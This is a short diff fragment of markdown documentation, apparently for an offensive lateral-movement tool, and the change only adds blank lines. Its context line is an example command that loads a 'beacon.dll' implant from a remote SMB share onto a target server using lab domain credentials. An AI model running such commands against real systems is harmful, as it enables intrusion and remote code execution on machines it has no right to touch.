@@ -15,3 +15,5 @@ updated_at: '2023-04-10T20:26:14.546143+00:00'
 ```bash
 /server:CASTLE /library:\\10.0.2.12\smb\beacon.dll /authdomain:LAB /authuser:Username /authpassword:Password01 /try:50
 ```
+
+
